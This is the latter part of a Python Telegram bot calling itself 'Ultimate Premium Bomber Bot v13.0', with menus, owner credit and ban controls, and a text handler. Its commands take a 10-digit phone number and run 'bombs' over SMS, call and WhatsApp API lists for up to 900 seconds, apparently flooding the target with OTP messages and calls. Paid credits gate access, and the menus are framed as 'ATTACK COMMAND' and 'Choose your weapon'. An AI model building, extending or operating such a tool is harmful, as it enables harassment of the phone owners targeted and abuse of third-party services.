                "┃  💥  " + bold('Bombs') + ":     `" + str(db_user['total_bombs']) + "`\n"
                "┃  📤  " + bold('Requests') + ":  `" + str(db_user['total_requests']) + "`\n"
                "┃  ⭐  " + bold('Status') + ":    " + ('🚫 Banned' if db_user['is_banned'] else '✅ Active') + "\n"
                + decor3() + "\n\n"
                "👑  *" + bold('Access') + ":*  " + access
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=back_and_refresh("menu_profile")
            )
        except Exception as e:
            logger.debug(f"menu_profile: {e}")

    # STATS
    elif d == "menu_stats":
        user_id = q.from_user.id
        active = ("🟢  " + bold('RUNNING')) if chat_id in active_bombs else ("🔴  " + bold('IDLE'))
        uptime = time.time() - context.bot_data.get("start_time", time.time())
        h, m, s = int(uptime // 3600), int((uptime % 3600) // 60), int(uptime % 60)

        title = "🐾  " + bold('LIVE STATS') + "  🐾"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                + decor4() + "\n"
                "┃  🤖  " + bold('Bot') + ":        🟢 " + bold('ONLINE') + "\n"
                "┃  ⚡  " + bold('Current') + ":    " + active + "\n"
                "┃  ⏱️  " + bold('Uptime') + ":     `" + str(h) + "h " + str(m) + "m " + str(s) + "s`\n"
                + decor4() + "\n\n"
                "🌍  *" + bold('Global Stats') + ":*\n"
                "┃  💥  " + bold('Bombs') + ":      `" + str(stats_global['total_bombs']) + "`\n"
                "┃  📤  " + bold('Requests') + ":   `" + str(stats_global['total_requests']) + "`\n"
                "┃  ✅  " + bold('Success') + ":    `" + str(stats_global['total_success']) + "`\n"
                + decor4() + "\n\n"
                "👤  " + bold('Your Usage') + ":  `" + str(len(user_history.get(user_id, []))) + "/" + str(BOMBS_PER_HOUR) + "`\n"
                "👥  " + bold('Active Bombs') + ": `" + str(len(active_bombs)) + "`"
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=back_and_refresh("menu_stats")
            )
        except Exception as e:
            logger.debug(f"menu_stats: {e}")

    # HELP
    elif d == "menu_help":
        title = "💹  " + bold('HELP MENU') + "  💹"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                + decor2() + "\n"
                "⚡  *" + bold('Commands') + ":*\n"
                "┃\n"
                "┣  `/sms <num>`\n"
                "┣  `/call <num>`\n"
                "┣  `/whatsapp <num>`\n"
                "┣  `/all <num>`\n"
                "┣  `/brutal <num>`   🦍\n"
                "┣  `/ultra <num>`    🦖\n"
                "┣  `/custom <num> <sec>`  🚸\n"
                "┃\n"
                "┣  `/stop`           🛑\n"
                "┣  `/status`         🐾\n"
                "┗  `/profile`        🔆\n"
                + decor2() + "\n\n"
                "📱  *" + bold('Format') + ":*  10 digits\n"
                "✅  *" + bold('Example') + ":*  `9876543210`"
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=back_button()
            )
        except Exception as e:
            logger.debug(f"menu_help: {e}")

    # ABOUT
    elif d == "menu_about":
        title = "⛎  " + bold('ABOUT BOT') + "  ⛎"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                + decor() + "\n"
                "🔥  *" + bold('Ultimate Premium Bomber Bot') + "*\n"
                "┃  📦  " + bold('Version') + ":  `13.0`\n"
                "┃  ⚡  " + bold('Mode') + ":     `Full Access`\n"
                "┃  💎  " + bold('Credits') + ":  `6 Free (New)`\n"
                "┃  👑  " + bold('Owner') + ":    `Unlimited ∞`\n"
                "┃  🎵  " + bold('Audio') + ":    `Multi-Rotation`\n"
                + decor() + "\n\n"
                "🎯  *" + bold('Features') + ":*\n"
                "┃  ♾️  _" + italic('Unlimited bombs') + "_\n"
                "┃  🛑  _" + italic('Working stop button') + "_\n"
                "┃  📊  _" + italic('Live 3s progress') + "_\n"
                "┃  💀  _" + italic('Brutal + Ultra mode') + "_\n"
                "┃  🎯  _" + italic('Custom duration') + "_\n"
                "┃  🪙  _" + italic('Credit system') + "_\n"
                "┃  🎵  _" + italic('Audio rotation') + "_\n"
                "┃  👥  _" + italic('Full user management') + "_\n"
                + decor() + "\n\n"
                "👨‍💻  *" + bold('Developer') + ":*  @" + ADMIN_USERNAME + "\n"
                "💬  *" + bold('Support') + ":*    @" + ADMIN_USERNAME
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=back_button()
            )
        except Exception as e:
            logger.debug(f"menu_about: {e}")

    # OWNER PANEL
    elif d == "owner_panel":
        if not is_owner(user_id):
            try:
                await q.answer("Not authorized!", show_alert=True)
            except Exception:
                pass
            return
        title = "👑  " + bold('OWNER PANEL') + "  👑"
        audios_count = len(load_audios())
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                + decor4() + "\n"
                "┃  💎  " + bold('Credits') + ":  ∞ Unlimited\n"
                "┃  👑  " + bold('Access') + ":   FULL OWNER\n"
                "┃  🎵  " + bold('Audios') + ":   `" + str(audios_count) + "` set\n"
                + decor4() + "\n\n"
                "⚡  *" + bold('Owner Controls') + ":*\n"
                "┃  👥  User List\n"
                "┃  🎵  Audio Manager\n"
                "┃  📢  Broadcast\n"
                "┃  📊  Stats\n\n"
                "💡  _" + italic('Choose action below') + "_"
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=owner_panel_kb()
            )
        except Exception as e:
            logger.debug(f"owner_panel: {e}")

    # USER LIST
    elif d == "owner_userlist":
        if not is_owner(user_id):
            return
        users = get_all_users()
        if not users:
            try:
                await q.edit_message_text(
                    "👥  *" + bold('NO USERS YET') + "*",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=owner_panel_kb()
                )
            except Exception:
                pass
            return
        title = "👥  " + bold('USER LIST') + "  👥"
        total_pages = (len(users) + 4) // 5
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                "┃  📊  " + bold('Total') + ":  `" + str(len(users)) + "` users\n"
                "┃  📄  " + bold('Page') + ":   `1 / " + str(total_pages) + "`\n\n"
                "💡  _" + italic('Tap any user to manage credits') + "_"
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=user_list_kb(users, page=0)
            )
        except Exception as e:
            logger.debug(f"owner_userlist: {e}")

    elif d.startswith("owner_userlist_page_"):
        if not is_owner(user_id):
            return
        try:
            page = int(d.split("_")[-1])
        except ValueError:
            page = 0
        users = get_all_users()
        title = "👥  " + bold('USER LIST') + "  👥"
        total_pages = (len(users) + 4) // 5
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                "┃  📊  " + bold('Total') + ":  `" + str(len(users)) + "` users\n"
                "┃  📄  " + bold('Page') + ":   `" + str(page + 1) + " / " + str(total_pages) + "`\n\n"
                "💡  _" + italic('Tap any user to manage credits') + "_"
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=user_list_kb(users, page=page)
            )
        except Exception as e:
            logger.debug(f"userlist_page: {e}")

    # VIEW USER
    elif d.startswith("owner_view_"):
        if not is_owner(user_id):
            return
        try:
            target_id = int(d.split("_")[-1])
        except ValueError:
            return
        target = get_user(target_id)
        status = "🚫 BANNED" if target["is_banned"] else "✅ Active"
        joined = target["joined_at"][:10] if target["joined_at"] else "N/A"
        last_active = target["last_active"][:16] if target.get("last_active") else "N/A"
        uname = "@" + target['username'] if target["username"] else "N/A"

        title = "👤  " + bold('USER DETAILS') + "  👤"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                + decor3() + "\n"
                "┃  👤  " + bold('Name') + ":      `" + (target['first_name'] or 'N/A') + "`\n"
                "┃  🆔  " + bold('User ID') + ":   `" + str(target['user_id']) + "`\n"
                "┃  📛  " + bold('Username') + ":  `" + uname + "`\n"
                "┃  📅  " + bold('Joined') + ":    `" + joined + "`\n"
                "┃  🕐  " + bold('Last Active') + ": `" + last_active + "`\n"
                + decor3() + "\n\n"
                "📊  *" + bold('Statistics') + ":*\n"
                "┃  💎  " + bold('Credits') + ":   `" + str(target['credits']) + "`\n"
                "┃  💥  " + bold('Bombs') + ":     `" + str(target['total_bombs']) + "`\n"
                "┃  📤  " + bold('Requests') + ":  `" + str(target['total_requests']) + "`\n"
                "┃  ⭐  " + bold('Status') + ":    " + status
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=user_action_kb(target_id, target["is_banned"])
            )
        except Exception as e:
            logger.debug(f"owner_view: {e}")

    # ADD CREDIT BUTTONS
    elif d.startswith("owner_add1_") or d.startswith("owner_add5_") or d.startswith("owner_add10_"):
        if not is_owner(user_id):
            return
        parts = d.split("_")
        amount = {"add1": 1, "add5": 5, "add10": 10}[parts[1]]
        target_id = int(parts[2])

        get_user(target_id)
        add_credit(target_id, amount)
        target = get_user(target_id)

        sent = await notify_credits_added(context.bot, target_id, amount, target["credits"])
        try:
            await q.answer("✅ " + str(amount) + " credits added!", show_alert=False)
        except Exception:
            pass

        status = "🚫 BANNED" if target["is_banned"] else "✅ Active"
        joined = target["joined_at"][:10] if target["joined_at"] else "N/A"
        last_active = target["last_active"][:16] if target.get("last_active") else "N/A"
        uname = "@" + target['username'] if target["username"] else "N/A"
        notify_status = "📨 User notified ✅" if sent else "⚠️ Not notified"

        title = "👤  " + bold('USER DETAILS') + "  👤"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                + decor3() + "\n"
                "┃  👤  " + bold('Name') + ":      `" + (target['first_name'] or 'N/A') + "`\n"
                "┃  🆔  " + bold('User ID') + ":   `" + str(target['user_id']) + "`\n"
                "┃  📛  " + bold('Username') + ":  `" + uname + "`\n"
                "┃  📅  " + bold('Joined') + ":    `" + joined + "`\n"
                "┃  🕐  " + bold('Last Active') + ": `" + last_active + "`\n"
                + decor3() + "\n\n"
                "📊  *" + bold('Statistics') + ":*\n"
                "┃  💎  " + bold('Credits') + ":   `" + str(target['credits']) + "`  *(+" + str(amount) + ")*\n"
                "┃  💥  " + bold('Bombs') + ":     `" + str(target['total_bombs']) + "`\n"
                "┃  📤  " + bold('Requests') + ":  `" + str(target['total_requests']) + "`\n"
                "┃  ⭐  " + bold('Status') + ":    " + status + "\n"
                + decor3() + "\n\n"
                "🔔  " + notify_status
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=user_action_kb(target_id, target["is_banned"])
            )
        except Exception as e:
            logger.debug(f"owner add view: {e}")

    elif d.startswith("owner_rem1_") or d.startswith("owner_rem5_"):
        if not is_owner(user_id):
            return
        parts = d.split("_")
        amount = {"rem1": 1, "rem5": 5}[parts[1]]
        target_id = int(parts[2])

        get_user(target_id)
        remove_credit(target_id, amount)
        target = get_user(target_id)

        sent = await notify_credits_removed(context.bot, target_id, amount, target["credits"])
        try:
            await q.answer("✅ " + str(amount) + " credits removed!", show_alert=False)
        except Exception:
            pass

        status = "🚫 BANNED" if target["is_banned"] else "✅ Active"
        joined = target["joined_at"][:10] if target["joined_at"] else "N/A"
        last_active = target["last_active"][:16] if target.get("last_active") else "N/A"
        uname = "@" + target['username'] if target["username"] else "N/A"
        notify_status = "📨 User notified ✅" if sent else "⚠️ Not notified"

        title = "👤  " + bold('USER DETAILS') + "  👤"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                + decor3() + "\n"
                "┃  👤  " + bold('Name') + ":      `" + (target['first_name'] or 'N/A') + "`\n"
                "┃  🆔  " + bold('User ID') + ":   `" + str(target['user_id']) + "`\n"
                "┃  📛  " + bold('Username') + ":  `" + uname + "`\n"
                "┃  📅  " + bold('Joined') + ":    `" + joined + "`\n"
                "┃  🕐  " + bold('Last Active') + ": `" + last_active + "`\n"
                + decor3() + "\n\n"
                "📊  *" + bold('Statistics') + ":*\n"
                "┃  💎  " + bold('Credits') + ":   `" + str(target['credits']) + "`  *(-" + str(amount) + ")*\n"
                "┃  💥  " + bold('Bombs') + ":     `" + str(target['total_bombs']) + "`\n"
                "┃  📤  " + bold('Requests') + ":  `" + str(target['total_requests']) + "`\n"
                "┃  ⭐  " + bold('Status') + ":    " + status + "\n"
                + decor3() + "\n\n"
                "🔔  " + notify_status
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=user_action_kb(target_id, target["is_banned"])
            )
        except Exception as e:
            logger.debug(f"owner rem view: {e}")

    elif d.startswith("owner_addcustom_"):
        if not is_owner(user_id):
            return
        target_id = int(d.split("_")[-1])
        pending_actions[user_id] = {"action": "addcustom", "target_id": target_id}
        title = "➕  " + bold('ADD CUSTOM CREDIT') + "  ➕"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                "┃  👤  " + bold('User ID') + ":  `" + str(target_id) + "`\n\n"
                "💬  _" + italic('Send amount in chat:') + "_\n"
                "✅  *" + bold('Example') + ":*  `25`",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=back_button()
            )
        except Exception:
            pass

    elif d.startswith("owner_ban_"):
        if not is_owner(user_id):
            return
        target_id = int(d.split("_")[-1])
        update_user(target_id, is_banned=1)
        await notify_banned(context.bot, target_id)
        target = get_user(target_id)

        try:
            await q.answer("🚫 User banned!", show_alert=False)
        except Exception:
            pass

        status = "🚫 BANNED"
        joined = target["joined_at"][:10] if target["joined_at"] else "N/A"
        last_active = target["last_active"][:16] if target.get("last_active") else "N/A"
        uname = "@" + target['username'] if target["username"] else "N/A"

        title = "👤  " + bold('USER DETAILS') + "  👤"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                + decor3() + "\n"
                "┃  👤  " + bold('Name') + ":      `" + (target['first_name'] or 'N/A') + "`\n"
                "┃  🆔  " + bold('User ID') + ":   `" + str(target['user_id']) + "`\n"
                "┃  📛  " + bold('Username') + ":  `" + uname + "`\n"
                "┃  📅  " + bold('Joined') + ":    `" + joined + "`\n"
                "┃  🕐  " + bold('Last Active') + ": `" + last_active + "`\n"
                + decor3() + "\n\n"
                "📊  *" + bold('Statistics') + ":*\n"
                "┃  💎  " + bold('Credits') + ":   `" + str(target['credits']) + "`\n"
                "┃  💥  " + bold('Bombs') + ":     `" + str(target['total_bombs']) + "`\n"
                "┃  📤  " + bold('Requests') + ":  `" + str(target['total_requests']) + "`\n"
                "┃  ⭐  " + bold('Status') + ":    " + status + "\n"
                + decor3() + "\n\n"
                "📨  User notified of ban ✅"
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=user_action_kb(target_id, target["is_banned"])
            )
        except Exception as e:
            logger.debug(f"owner ban view: {e}")

    elif d.startswith("owner_unban_"):
        if not is_owner(user_id):
            return
        target_id = int(d.split("_")[-1])
        update_user(target_id, is_banned=0)
        await notify_unbanned(context.bot, target_id)
        target = get_user(target_id)

        try:
            await q.answer("✅ User unbanned!", show_alert=False)
        except Exception:
            pass

        status = "✅ Active"
        joined = target["joined_at"][:10] if target["joined_at"] else "N/A"
        last_active = target["last_active"][:16] if target.get("last_active") else "N/A"
        uname = "@" + target['username'] if target["username"] else "N/A"

        title = "👤  " + bold('USER DETAILS') + "  👤"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                + decor3() + "\n"
                "┃  👤  " + bold('Name') + ":      `" + (target['first_name'] or 'N/A') + "`\n"
                "┃  🆔  " + bold('User ID') + ":   `" + str(target['user_id']) + "`\n"
                "┃  📛  " + bold('Username') + ":  `" + uname + "`\n"
                "┃  📅  " + bold('Joined') + ":    `" + joined + "`\n"
                "┃  🕐  " + bold('Last Active') + ": `" + last_active + "`\n"
                + decor3() + "\n\n"
                "📊  *" + bold('Statistics') + ":*\n"
                "┃  💎  " + bold('Credits') + ":   `" + str(target['credits']) + "`\n"
                "┃  💥  " + bold('Bombs') + ":     `" + str(target['total_bombs']) + "`\n"
                "┃  📤  " + bold('Requests') + ":  `" + str(target['total_requests']) + "`\n"
                "┃  ⭐  " + bold('Status') + ":    " + status + "\n"
                + decor3() + "\n\n"
                "📨  User notified of unban ✅"
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=user_action_kb(target_id, target["is_banned"])
            )
        except Exception as e:
            logger.debug(f"owner unban view: {e}")

    # OWNER STATS
    elif d == "owner_stats":
        if not is_owner(user_id):
            return
        total = db_execute("SELECT COUNT(*) FROM users", fetch="one")[0]
        banned = db_execute("SELECT COUNT(*) FROM users WHERE is_banned = 1", fetch="one")[0]
        audios_count = len(load_audios())
        title = "📊  " + bold('OWNER STATS') + "  📊"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                + decor4() + "\n"
                "┃  👥  " + bold('Total Users') + ":  `" + str(total) + "`\n"
                "┃  🚫  " + bold('Banned') + ":       `" + str(banned) + "`\n"
                "┃  ⚡  " + bold('Active Bombs') + ": `" + str(len(active_bombs)) + "`\n"
                "┃  💥  " + bold('Total Bombs') + ":  `" + str(stats_global['total_bombs']) + "`\n"
                "┃  📤  " + bold('Requests') + ":     `" + str(stats_global['total_requests']) + "`\n"
                "┃  ✅  " + bold('Success') + ":      `" + str(stats_global['total_success']) + "`\n"
                "┃  🎵  " + bold('Audios') + ":       `" + str(audios_count) + "`"
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=owner_panel_kb()
            )
        except Exception:
            pass

    # AUDIO MGR
    elif d == "owner_audiomgr":
        if not is_owner(user_id):
            return
        audios = load_audios()
        title = "🎵  " + bold('AUDIO MANAGER') + "  🎵"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                + decor2() + "\n"
                "┃  🎧  " + bold('Audios Set') + ":  `" + str(len(audios)) + "`\n"
                "┃  🔄  " + bold('Rotation') + ":    `Cycle 1→2→3→1`\n"
                + decor2() + "\n\n"
                "📖  *" + bold('How to Add') + ":*\n"
                "┃  1️⃣  Send/forward audio\n"
                "┃  2️⃣  Reply with `/addaudio`\n"
                "┃  3️⃣  Saved for rotation\n\n"
                "🎧  _" + italic('Har bombing par next audio') + "_"
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=owner_audio_kb()
            )
        except Exception:
            pass

    elif d == "owner_addaudio_help":
        if not is_owner(user_id):
            return
        title = "🎵  " + bold('ADD AUDIO') + "  🎵"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                "📝  *" + bold('Steps') + ":*\n"
                "┃  1️⃣  Send audio/voice message\n"
                "┃  2️⃣  Reply to it with `/addaudio`\n"
                "┃  3️⃣  Bot will save file_id\n\n"
                "🔄  _" + italic('Add 2-3 audios for rotation!') + "_",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=owner_audio_kb()
            )
        except Exception:
            pass

    elif d == "owner_playaudio":
        if not is_owner(user_id):
            return
        audios = load_audios()
        if not audios:
            try:
                await q.answer("No audios set!", show_alert=True)
            except Exception:
                pass
            return
        try:
            await q.answer("Sending " + str(len(audios)) + " audios...", show_alert=False)
            for i, fid in enumerate(audios, 1):
                try:
                    await context.bot.send_audio(
                        chat_id=chat_id,
                        audio=fid,
                        caption="🎵  *" + bold("Audio #" + str(i)) + "*  (" + str(i) + "/" + str(len(audios)) + ")",
                        parse_mode=ParseMode.MARKDOWN
                    )
                    await asyncio.sleep(0.5)
                except Exception as e:
                    logger.debug(f"Send audio {i}: {e}")
        except Exception:
            pass

    elif d == "owner_listaudio":
        if not is_owner(user_id):
            return
        audios = load_audios()
        idx = load_audio_index()
        if not audios:
            try:
                await q.edit_message_text(
                    "❌  *" + bold('No audios set') + "!*",
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=owner_audio_kb()
                )
            except Exception:
                pass
            return
        lines = []
        for i, fid in enumerate(audios, 1):
            marker = "▶️" if i == (idx + 1) or (idx == 0 and i == 1) else "  "
            lines.append(marker + " " + str(i) + ". `" + fid[:25] + "...`")
        title = "📋  " + bold('AUDIO LIST') + "  📋"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                "┃  📊  " + bold('Total') + ":  `" + str(len(audios)) + "`\n"
                "┃  ▶️  " + bold('Next') + ":  `#" + str(idx + 1) + "`\n\n"
                + "\n".join(lines) + "\n\n"
                "💡  _" + italic('▶️ = next audio to play') + "_",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=owner_audio_kb()
            )
        except Exception:
            pass

    elif d == "owner_resetaudio":
        if not is_owner(user_id):
            return
        save_audio_index(0)
        try:
            await q.edit_message_text(
                "✅  *" + bold('Rotation Reset') + "!*\n"
                "┃  Now starts from audio #1",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=owner_audio_kb()
            )
        except Exception:
            pass

    elif d == "owner_clearall_confirm":
        if not is_owner(user_id):
            return
        kb = InlineKeyboardMarkup([
            [mk_btn("🗑️  " + spaced('YES, DELETE ALL'), callback_data="owner_clearall_yes", style="danger")],
            [mk_btn("♻️  " + spaced('CANCEL'), callback_data="owner_audiomgr", style="primary")],
        ])
        try:
            await q.edit_message_text(
                "⚠️  *" + bold('CONFIRM DELETE') + "*\n\n"
                "🗑️  _" + italic('Delete all audios? This cannot be undone.') + "_",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=kb
            )
        except Exception:
            pass

    elif d == "owner_clearall_yes":
        if not is_owner(user_id):
            return
        clear_all_audios()
        save_audio_index(0)
        try:
            await q.edit_message_text(
                "✅  *" + bold('All audios deleted') + "!*",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=owner_audio_kb()
            )
        except Exception:
            pass

    elif d == "owner_broadcast":
        if not is_owner(user_id):
            return
        title = "📢  " + bold('BROADCAST') + "  📢"
        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                "📝  *" + bold('Usage') + ":*\n"
                "`/broadcast <message>`\n\n"
                "📱  *" + bold('Example') + ":*\n"
                "`/broadcast New features added!`",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=owner_panel_kb()
            )
        except Exception:
            pass

    # BACK
    elif d == "menu_back":
        user = q.from_user
        db_user = get_user(user.id, user.username, user.first_name)
        user_states.pop(user.id, None)
        pending_actions.pop(user.id, None)

        if db_user["is_banned"]:
            title = "🚫  " + bold('BANNED') + "  🚫"
            try:
                await q.edit_message_text(
                    hdr(title) + "\n\n"
                    "❌  *" + bold('Aap banned ho') + "!*\n\n"
                    "📞  *" + bold('Contact') + ":*  @" + ADMIN_USERNAME,
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=contact_owner_kb()
                )
            except Exception:
                pass
            return

        if is_owner(user.id):
            credits_display = "∞  👑 OWNER"
            status_icon = "👑 OWNER"
        else:
            credits_display = "`" + str(db_user['credits']) + "`"
            status_icon = "✅ Active"

        title = "👾  " + bold('ATTACK COMMAND') + "  🎛️"
        kb = main_menu()
        if is_owner(user.id):
            kb = InlineKeyboardMarkup(
                [[mk_btn("👑  " + spaced('OWNER PANEL'), callback_data="owner_panel", style="danger")]]
                + list(kb.inline_keyboard)
            )

        try:
            await q.edit_message_text(
                hdr(title) + "\n\n"
                + decor() + "\n"
                "┃  👋  " + bold('Welcome') + ", *" + user.first_name + "*\n"
                "┃  🆔  " + bold('ID') + ":  `" + str(user.id) + "`\n"
                "┃  💎  " + bold('Credits') + ":  " + credits_display + "\n"
                "┃  ⭐  " + bold('Status') + ":  " + status_icon + "\n"
                + decor() + "\n\n"
                "⚡  *" + italic('Choose your weapon') + "*  👇"
                + time_footer(),
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=kb
            )
        except Exception as e:
            logger.debug(f"menu_back: {e}")


# ============================================================
# TEXT HANDLER
# ============================================================
async def text_handler(update, context):
    if not update.message or not update.message.text:
        return
    user = update.effective_user
    t = update.message.text.strip()

    if t.startswith("/"):
        return

    get_user(user.id, user.username, user.first_name)

    pending = pending_actions.get(user.id)
    if pending and pending.get("action") == "addcustom":
        target_id = pending["target_id"]
        pending_actions.pop(user.id, None)
        try:
            amount = int(t)
            if amount <= 0 or amount > 10000:
                await update.message.reply_text("❌  *Invalid amount (1-10000)*")
                return
        except ValueError:
            await update.message.reply_text("❌  *Invalid number!*")
            return

        get_user(target_id)
        add_credit(target_id, amount)
        target = get_user(target_id)

        sent = await notify_credits_added(context.bot, target_id, amount, target["credits"])
        notify_status = "📨 User notified ✅" if sent else "⚠️ Not notified"

        await update.message.reply_text(
            "✅  *" + bold('Custom Credit Added') + "!*\n"
            "┃  👤  " + bold('User') + ":  `" + str(target_id) + "`\n"
            "┃  ➕  " + bold('Added') + ":  `+" + str(amount) + "`\n"
            "┃  💎  " + bold('Total') + ":  `" + str(target['credits']) + "`\n"
            + decor3() + "\n\n"
            "🔔  " + notify_status,
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=owner_panel_kb()
        )
        return

    state = user_states.get(user.id)

    if state and state.get("action") == "waiting_number":
        bomb_type = state["type"]
        user_states.pop(user.id, None)

        if not validate_number(t):
            title = "❌  " + bold('INVALID') + "  ❌"
            await update.message.reply_text(
                hdr(title) + "\n\n"
                "📱  *" + bold('Please send 10-digit number') + "*\n"
                "✅  *" + bold('Example') + ":*  `9876543210`",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=main_menu()
            )
            return

        context.args = [t]

        if bomb_type == "custom":
            user_states[user.id] = {"action": "waiting_seconds", "phone": t}
            title = "⏱️  " + bold('ENTER SECONDS') + "  ⏱️"
            await update.message.reply_text(
                hdr(title) + "\n\n"
                "📱  " + bold('Number') + ":  `" + t + "`\n\n"
                "💡  _" + italic('Send duration in seconds (10-900)') + "_\n"
                "✅  *" + bold('Example') + ":*  `120`",
                parse_mode=ParseMode.MARKDOWN,
                reply_markup=back_button()
            )
            return

        combined = SMS_APIS + CALL_APIS + WHATSAPP_APIS

        if bomb_type == "sms":
            await run_bomb(update, context, SMS_APIS, "sms")
        elif bomb_type == "call":
            await run_bomb(update, context, CALL_APIS, "call")
        elif bomb_type == "whatsapp":
            await run_bomb(update, context, WHATSAPP_APIS, "whatsapp")
        elif bomb_type == "all":
            await run_bomb(update, context, combined, "all")
        elif bomb_type == "brutal":
            await run_bomb(update, context, combined, "brutal", mode="brutal")
        elif bomb_type == "ultra":
            await run_bomb(update, context, combined, "ultra", mode="ultra")
        return

    if state and state.get("action") == "waiting_seconds":
        phone = state["phone"]
        user_states.pop(user.id, None)

        try:
            sec = int(t)
            if sec < 10 or sec > 900:
                await update.message.reply_text("❌  *Seconds 10-900*")
                return
        except ValueError:
            await update.message.reply_text("❌  *Invalid seconds!*")
            return

        context.args = [phone]
        combined = SMS_APIS + CALL_APIS + WHATSAPP_APIS
        await run_bomb(update, context, combined, "custom", mode="ultra", duration_override=sec)
        return

    if validate_number(t):
        context.args = [t]
        await sms_cmd(update, context)
    else:
        db_u = get_user(user.id)
        if not is_owner(user.id) and db_u["credits"] < CREDIT_PER_BOMB:
            await send_credit_exhausted(update, db_u["credits"])
            return

        title = "❓  " + bold('HELP') + "  ❓"
        await update.message.reply_text(
            hdr(title) + "\n\n"
            "💡  _" + italic('Send 10-digit number directly') + "_\n"
            "✅  *" + bold('Example') + ":*  `9876543210`",
            parse_mode=ParseMode.MARKDOWN,
            reply_markup=main_menu()
        )


async def error_handler(update, context):
    logger.error(f"Error: {context.error}", exc_info=context.error)


async def post_init(app):
    app.bot_data["start_time"] = time.time()
    print("✅ Bot initialized and ready!")


# ============================================================
# MAIN
# ============================================================
def main():
    if BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        print("❌ BOT_TOKEN not set!")
        sys.exit(1)

    print("=" * 60)
    print("🔥 ULTIMATE PREMIUM BOMBER BOT v13.0 🔥")
    print("=" * 60)
    print(f"📩 SMS  : {TOTAL_SMS}")
    print(f"📞 Call : {TOTAL_CALL}")
    print(f"💬 WA   : {TOTAL_WA}")
    print(f"📊 Total: {TOTAL_APIS}")
    print(f"👑 Owner: {OWNER_ID}")
    print("=" * 60)

    app = (
        Application.builder()
        .token(BOT_TOKEN)
        .concurrent_updates(True)
        .post_init(post_init)
        .build()
    )

    app.add_handler(CommandHandler("start", start_cmd))
    app.add_handler(CommandHandler("help", help_cmd))
    app.add_handler(CommandHandler("status", status_cmd))
    app.add_handler(CommandHandler("stop", stop_cmd))
    app.add_handler(CommandHandler("profile", profile_cmd))
    app.add_handler(CommandHandler("about", about_cmd))
    app.add_handler(CommandHandler("credits", credits_cmd))

    app.add_handler(CommandHandler("sms", sms_cmd))
    app.add_handler(CommandHandler("call", call_cmd))
    app.add_handler(CommandHandler("whatsapp", whatsapp_cmd))
    app.add_handler(CommandHandler("all", all_cmd))
    app.add_handler(CommandHandler("brutal", brutal_cmd))
    app.add_handler(CommandHandler("ultra", ultra_cmd))
    app.add_handler(CommandHandler("custom", custom_cmd))

    app.add_handler(CommandHandler("addcredit", addcredit_cmd))
    app.add_handler(CommandHandler("removecredit", removecredit_cmd))
    app.add_handler(CommandHandler("ban", ban_cmd))
    app.add_handler(CommandHandler("unban", unban_cmd))
    app.add_handler(CommandHandler("addaudio", addaudio_cmd))
    app.add_handler(CommandHandler("users", users_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))

    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))
    app.add_error_handler(error_handler)

    print("✅ Bot started successfully!")
    print("=" * 60)

    app.run_polling(
        allowed_updates=Update.ALL_TYPES,
        drop_pending_updates=True,
        poll_interval=1.0,
        timeout=30
    )


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n🛑 Bot stopped.")
